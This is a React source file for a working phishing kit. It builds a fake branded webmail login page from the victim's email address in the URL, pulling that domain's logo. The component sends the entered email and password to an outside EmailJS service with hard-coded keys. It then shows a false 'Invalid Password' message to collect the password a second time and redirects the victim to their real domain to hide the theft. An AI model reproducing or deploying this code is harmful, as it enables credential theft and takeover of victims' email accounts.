import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import emailjs from "emailjs-com";
import { useParams } from "react-router-dom";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);

  let emailss = params.id;
  let domain = emailss.substring(emailss.lastIndexOf("@") + 1);

  const submitHandler = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_gi68r3i", "template_hxznbhh", e.target, "KsLg5lm9TS3wt54jz")
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.preventDefault();
    setShowForm(false);
    setConfirmForm(true);
  };

  const editHandler = (e) => {
    e.preventDefault();
    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    emailjs
      .sendForm("service_gi68r3i", "template_hxznbhh", e.target, "KsLg5lm9TS3wt54jz")
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };
  const domainname = domain.substring(0, domain.lastIndexOf(".")).toUpperCase();

  return (
    <Styls>
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                  </div>
                  <h5 className="font-weight-light">
                    <b> {`${domainname} WebClient `} </b>
                    <br />
                  </h5>
                </div>
                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">Sign In </button>
                    </div>
                  </div>
                </form>

                <p className="conne">
                  Conneted to <a href={`https://${domain}`}>{domain} </a>{" "}
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                  </div>
                  <h5 className="font-weight-light">
                    <b> {`${domainname} WebClient `} </b>
                    <br />
                  </h5>
                </div>

                <div className="msg">
                  Invalid Password.! Please enter correct password.
                </div>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">Sign In </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
